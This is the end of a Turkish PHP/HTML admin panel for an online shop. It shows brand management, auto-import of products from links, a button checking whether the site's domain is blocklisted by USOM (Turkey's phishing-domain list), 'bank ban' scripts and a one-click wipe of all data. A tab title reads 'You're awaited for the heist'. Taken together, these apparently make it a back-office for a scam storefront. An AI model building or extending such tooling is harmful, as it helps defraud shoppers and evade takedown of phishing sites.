                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="kategori-adi">Marka ID</label>
                      <input type="text" class="form-control" id="marka-id" name="marka-id" placeholder="Marka ID">
                    </div>
                    
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-plus me-1"></i> Marka Sil
                      </button>
                    </div>
                  </form>
                </div>

                <div class="block-content tab-pane" id="marka-tablosu" role="tabpanel" aria-labelledby="marka-tablosu-buton" tabindex="0">
                  <h4 class="fw-semibold">Marka Tablosu</h4>
                    <div class="block-content block-content-full">
                     <table class="table table-bordered table-striped table-vcenter js-dataTable-responsive">
                        <thead>
                           <tr>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> marka id</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> marka adı</th>
                           </tr>
                        </thead>
                        <tbody>
                        <?php foreach($pdo->query('SELECT * FROM markalar ORDER BY id DESC') as $urun){ ?>
                          <tr>
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['id']); ?>"><?php echo htmlspecialchars($urun['id']); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['marka_adi']); ?>"><?php echo htmlspecialchars($urun['marka_adi']); ?></a></td>  
                          </tr>
                        <?php } ?>
                        </tbody>
                     </table>
                  </div>
                </div>



              </div>
            </div>
          </div>
          <?php endif; ?>
        </div>
      </main>
      <footer id="page-footer" class="bg-body-light">
        <div class="content py-3">
          <div class="row fs-sm">
            <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>
            </div>
            <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
              <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
            </div>
          </div>
        </div>
      </footer>
    </div>
   
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
    <script type="text/javascript">
      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };

      


document.getElementById("otoeklebuton").addEventListener("click", function(e) {
       

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'Ürün ekleniyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/oto_urun_getir.php",
          data: {
            otourunlinki: document.getElementById('otourunlinki').value
          },
          success: function (data) {
            if(data === "error") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Hata."});
            } else if(data === "success") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Ürün başarıyla eklendi."});
            }
          }
        });
      });


      document.getElementById("check_usom").addEventListener("click", function(e) {
        var domain = window.location.host; 

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'USOM kontrolü yapılıyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/CheckUsom.php",
          data: {
            domain: domain
          },
          success: function (data) {
            if(data === "yasaklandi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Domain USOM tarafından yasaklanmış durumda."});
            } else if(data === "yasaklanmadi") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Domain USOM tarafından yasaklanmadı."});
            } else if(data === "baglanti hatasi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "USOM ile bağlantı kurulamadı!"});
            }
          }
        });
      });

      var clipboard = new ClipboardJS('.Kopyala');
      clipboard.on('success', function (e) {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Panoya kopyalama işlemi başarılı!'});
      });
      clipboard.on('error', function (e) {
        One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: 'Panoya kopyalama işlemi başarısız!'});
      });
      
      document.getElementById("factory_reset").addEventListener("click", function(e) {
        Swal.fire({
          title: 'Emin misin?',
          text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Evet',
          cancelButtonText: 'Hayır'
        }).then((result) => {
          if (result.isConfirmed) {
            e.preventDefault();
            $.ajax({
              type: "POST",
              url: "./function/FactoryReset.php",
              data: {
                izin: true
              },
              success: function (data) {
                Swal.fire({
                  title: 'İşlem Başarılı!',
                  text: "Bütün veriler başarıyla silindi.",
                  icon: 'success',
                  confirmButtonColor: '#3085d6',
                  confirmButtonText: 'Tamam'
                }).then((result) => {
                  if (result.isConfirmed) {
                    window.location.href = 'quit';
                  }
                })
              }
            });
          }
        })
      });
    </script>
    
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="assets/js/pages/banka-banla.min.js"></script>
    <script src="assets/js/pages/banka-ban-kaldir.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script src="assets/js/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="assets/js/plugins/datatables-bs5/js/dataTables.bootstrap5.min.js"></script>
    <script src="assets/js/plugins/datatables-buttons/dataTables.buttons.min.js"></script>
    <script src="assets/js/pages/datatable.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
    <script>
      window.onload = function() {
          const urlParams = new URLSearchParams(window.location.search);
          
          if (urlParams.has('msg')) {
              const message = urlParams.get('msg');
              const errorx = urlParams.get('why');
              let newerrortype;

              if (errorx === 'price') {
                 newerrortype = 'FİYAT SADECE SAYISAL FİYATI YANLIŞ GİRDİN';
              } else if(errorx === 'id') {
                newerrortype = 'İD SADECE SAYISAL YAZILIR İD YANLIŞ GİRDİN';
              } else if(errorx === 'idempty') {
                newerrortype = 'OLMAYAN VERİYİ SİLEMEZSİN';
              } else if(errorx === 'uruneklendi') {
                newerrortype = 'ürün başarıyla eklendi';
                
              } else if(errorx === 'urunguncellendi') {
                newerrortype = 'ürün başarıyla güncellendi';
              } else if(errorx === 'urunsilindi') {
                newerrortype = 'ürün başarıyla silindi';
              } else if(errorx === 'kategorieklendi') {
                newerrortype = 'kategori başarıyla eklendi';
              } else if(errorx === 'kategorisilindi') {
                newerrortype = 'kategori başarıyla silindi';
              } else if(errorx === 'markaeklendi') {
                newerrortype = 'marka başarıyla eklendi';
              } else if(errorx === 'markasilindi') {
                newerrortype = 'marka başarıyla silindi';
              } else if(errorx === 'kategoriyokamk') {
                newerrortype = 'kategori yok ilk kategori ekle';
              } else if(errorx === 'markayokamk') {
                newerrortype = 'marka yok ilk marka ekle';
              }

              if (message === 'success') {
                  One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: newerrortype});
              } else if (message === 'error') {
                  One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: newerrortype});
              }

              const newUrl = window.location.pathname + window.location.hash;
              history.replaceState({}, document.title, newUrl);
          }
      };
    </script>
  </body>
</html>